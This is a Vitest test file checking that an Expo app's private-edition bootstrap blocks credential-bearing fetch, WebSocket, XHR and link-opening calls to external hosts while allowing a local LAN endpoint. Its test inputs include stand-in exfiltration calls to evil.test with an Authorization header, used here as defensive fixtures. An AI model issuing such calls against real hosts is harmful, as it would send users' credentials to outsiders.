import { it, expect, vi } from 'vitest';
const native = vi.hoisted(() => ({ Linking: { openURL: vi.fn() }, Platform: { OS: 'android' } }));
vi.mock('react-native', () => native);
vi.mock('expo-constants', () => ({ default: { expoConfig: { extra: { privateEdition: true, e2eMode: true } } } }));

it('blocks credential-bearing external fetch, XHR, sockets and links before transport', async () => {
  const sent = vi.fn(async () => new Response('{}'));
  const sockets = vi.fn();
  const requests = vi.fn();
  vi.stubGlobal('fetch', sent);
  vi.stubGlobal('WebSocket', class { constructor(url: string) { sockets(url); } });
  vi.stubGlobal('XMLHttpRequest', class { open(...args: unknown[]) { requests(...args); } });
  await import('../../lib/private/bootstrap');
  const credentials = { headers: { Authorization: 'Basic synthetic-test-only' } };
  expect(() => fetch('https://evil.test/collect', credentials)).toThrow();
  expect(() => new WebSocket('ws://evil.test/')).toThrow();
  expect(() => new XMLHttpRequest().open('GET', 'https://evil.test/')).toThrow();
  await expect(native.Linking.openURL('https://evil.test/')).rejects.toThrow();
  expect(sent).not.toHaveBeenCalled();
  expect(sockets).not.toHaveBeenCalled();
  expect(requests).not.toHaveBeenCalled();
  await fetch('http://10.0.0.2:47119/api/info', credentials);
  expect(sent).toHaveBeenCalledWith('http://10.0.0.2:47119/api/info', { ...credentials, redirect: 'error' });
  new WebSocket('ws://10.0.0.2:47119/api/pty/test/connect');
  expect(sockets).toHaveBeenCalledOnce();
  vi.unstubAllGlobals();
});
